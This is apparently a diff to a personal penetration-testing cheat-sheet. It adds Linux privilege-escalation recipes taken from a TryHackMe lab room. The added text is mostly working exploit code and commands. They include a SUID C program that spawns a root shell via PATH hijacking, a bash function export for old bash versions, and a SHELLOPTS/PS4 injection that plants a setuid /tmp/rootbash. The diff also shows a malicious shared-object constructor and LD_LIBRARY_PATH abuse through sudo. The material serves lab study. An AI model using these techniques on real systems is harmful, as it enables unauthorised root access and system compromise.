@@ -476,6 +476,34 @@ WantedBy=multi-user.target
 /bin/systemctl start root
 ```
 
+### [Exploiting services] example taken from -> https://tryhackme.com/room/linuxprivesc
+```
+1. strings on the binary or script that calls the service
+2. compile the suid bin
+
+gcc -o service /home/user/tools/suid/service.c
+
+int main() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+
+3. execute `PATH=.:$PATH /usr/local/bin/suid-env` to run a root shell.
+```
+
+### [Privilege escalation by exploting bash `versions <4.2-048`] example taken from -> https://tryhackme.com/room/linuxprivesc
+```
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+
+### [Privilege escalation abusing bin variables by setting them to environment] example taken from -> https://tryhackme.com/room/linuxprivesc
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+/tmp/rootbash -p
+```
+
 ### [restricted shell bypassing]
 https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
 
@@ -548,6 +576,23 @@ ldd /usr/sbin/apache2
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 
 sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+### [exploiting bins with references to non-existent shared objects] example taken from -> https://tryhackme.com/room/linuxprivesc
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+	setuid(0);
+	system("/bin/bash -p");
+}
 ```
 
 ### [Sudo inject]
